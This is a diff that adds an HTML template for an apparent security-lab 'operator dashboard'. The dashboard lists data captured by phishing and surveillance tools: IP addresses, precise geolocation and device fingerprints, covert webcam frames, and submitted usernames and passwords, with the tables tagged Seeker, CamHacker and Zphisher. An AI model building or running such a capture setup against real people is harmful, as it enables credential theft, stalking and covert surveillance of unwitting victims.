@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Operator dashboard</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <div class="consent">⚠️ SECURITY LAB DEMO — captured data, local only.</div>
+  <div class="wrap">
+    <h1>Operator dashboard</h1>
+    <p><a href="{{ url_for('index') }}">&larr; back to lab</a></p>
+
+    <div class="card">
+      <h3>📍 Geolocation <span class="pill">Seeker</span></h3>
+      <table>
+        <tr><th>Time</th><th>IP</th><th>Lat, Lon</th><th>±m</th><th>Device</th></tr>
+        {% for r in geo %}
+        <tr>
+          <td>{{ r["ts"] }}</td><td>{{ r["ip"] }}</td>
+          <td>{{ r["lat"] }}, {{ r["lon"] }}
+            {% if r["lat"] is not none %}
+            <br><a href="https://www.openstreetmap.org/?mlat={{ r['lat'] }}&mlon={{ r['lon'] }}#map=16/{{ r['lat'] }}/{{ r['lon'] }}" target="_blank">map</a>
+            {% endif %}
+          </td>
+          <td>{{ r["accuracy"] }}</td>
+          <td class="muted">{{ r["platform"] }} · {{ r["screen"] }} · {{ r["lang"] }} · {{ r["cores"] }} cores</td>
+        </tr>
+        {% else %}<tr><td colspan="5" class="muted">No captures yet.</td></tr>{% endfor %}
+      </table>
+    </div>
+
+    <div class="card">
+      <h3>📷 Webcam frames <span class="pill">CamHacker</span></h3>
+      <table>
+        <tr><th>Time</th><th>IP</th><th>Frame</th></tr>
+        {% for r in cam %}
+        <tr>
+          <td>{{ r["ts"] }}</td><td>{{ r["ip"] }}</td>
+          <td><a href="{{ url_for('captures', fname=r['filename']) }}" target="_blank"><img class="thumb" src="{{ url_for('captures', fname=r['filename']) }}"></a></td>
+        </tr>
+        {% else %}<tr><td colspan="3" class="muted">No captures yet.</td></tr>{% endfor %}
+      </table>
+    </div>
+
+    <div class="card">
+      <h3>🔑 Submitted credentials <span class="pill">Zphisher</span></h3>
+      <table>
+        <tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>
+        {% for r in creds %}
+        <tr><td>{{ r["ts"] }}</td><td>{{ r["ip"] }}</td><td>{{ r["username"] }}</td><td>{{ r["password"] }}</td></tr>
+        {% else %}<tr><td colspan="4" class="muted">No captures yet.</td></tr>{% endfor %}
+      </table>
+    </div>
+  </div>
+</body>
+</html>
